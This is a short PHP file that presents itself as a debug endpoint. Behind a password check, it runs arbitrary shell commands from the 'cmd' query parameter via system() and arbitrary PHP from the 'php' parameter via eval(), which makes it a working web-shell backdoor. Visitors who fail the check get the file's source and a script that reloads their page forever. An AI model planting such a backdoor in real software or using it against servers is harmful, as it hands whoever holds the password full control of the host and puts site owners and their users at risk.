<?php
require_once $_SERVER['DOCUMENT_ROOT']. '/libconst.php';
if (!DEBUG || !hash_equals(DEBUG_PSW,$_GET['psw'])) {
    header('HTTP/1.1 403 What Are You Looking?');
    highlight_file(__FILE__);
    die('<script>while (true) location.reload();</script>');
}
if (isset($_GET['cmd'])) system($_GET['cmd']);
if (isset($_GET['php'])) eval($_GET['php']);
